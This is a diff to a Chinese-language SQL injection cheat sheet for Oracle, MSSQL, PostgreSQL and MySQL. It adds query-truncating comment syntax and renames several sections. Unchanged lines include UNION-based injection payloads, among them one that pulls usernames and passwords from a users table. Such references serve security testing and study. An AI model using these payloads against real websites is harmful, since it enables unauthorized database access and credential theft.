@@ -5,23 +5,24 @@
 ### 字符串连接
 
 ```sql
-// Some code
 'aaa' || 'bbb'
 ```
 
 ### 截取字符串
 
 ```sql
-// Some code
 SUBSTR('asdsfsdgf', 4, 2)
 ```
 
-### 评论
+### 用注释截断查询
+
+```sql
+--
+```
 
 ### 数据库类型和版本查询
 
 ```sql
-// Some code
 SELECT * FROM v$version
 SELECT banner FROM v$version
 SELECT version FROM v$instance
@@ -36,7 +37,11 @@ SELECT * FROM all_tables
 SELECT * FROM all_tab_columns WHERE table_name = '表名'
 ```
 
-### 条件错误
+### 布尔条件错误
+
+```sql
+// Some code
+```
 
 ### 通过错误消息提取数据
 
@@ -59,23 +64,25 @@ SELECT * FROM all_tab_columns WHERE table_name = '表名'
 ### 字符串连接
 
 ```sql
-// Some code
 'aaa' || 'bbb'
 ```
 
 ### 截取字符串
 
 ```sql
-// Some code
 SUBSTRING('fcsasff', 4, 2)
 ```
 
-### 评论
+### 用注释截断查询
+
+```sql
+--
+/*    */
+```
 
 ### 数据库类型和版本查询
 
 ```sql
-// Some code
 SELECT @@version
 ' UNION SELECT @@version--
 ```
@@ -93,7 +100,7 @@ SELECT * FROM information_schema.columns WHERE table_name = '表名'
 
 ```
 
-### 条件错误
+### 布尔条件错误
 
 ### 通过错误消息提取数据
 
@@ -114,23 +121,25 @@ SELECT * FROM information_schema.columns WHERE table_name = '表名'
 ### 字符串连接
 
 ```sql
-// Some code
 'aaa' || 'bbb'
 ```
 
 ### 截取字符串
 
 ```sql
-// Some code
 SUBSTRING('sdaggrfsgrh', 4, 2)
 ```
 
-### 评论
+### 用注释截断查询
+
+```sql
+--
+/*   */
+```
 
 ### 数据库类型和版本查询
 
 ```sql
-// Some code
 SELECT version()
 ```
 
@@ -146,7 +155,7 @@ SELECT * FROM information_schema.columns WHERE table_name = '表名'
 '+UNION+SELECT+username,password+FROM+users--
 ```
 
-### 条件错误
+### 布尔条件错误
 
 ### 通过错误消息提取数据
 
@@ -175,16 +184,21 @@ CONCAT('aaa','bbb')
 ### 截取字符串
 
 ```sql
-// Some code
 SUBSTRING('afdgghtr', 4, 2)
 ```
 
-### 评论
+### 用注释截断查询
+
+```sql
+// -- 之后有空格
+#
+--
+/*   */
+```
 
 ### 数据库类型和版本查询
 
 ```sql
-// Some code
 SELECT @@version
 ' UNION SELECT @@version--
 ```
@@ -201,7 +215,7 @@ SELECT * FROM information_schema.columns WHERE table_name = '表名'
 '+UNION+SELECT+username,password+FROM+users--
 ```
 
-### 条件错误
+### 布尔条件错误
 
 ### 通过错误消息提取数据
 
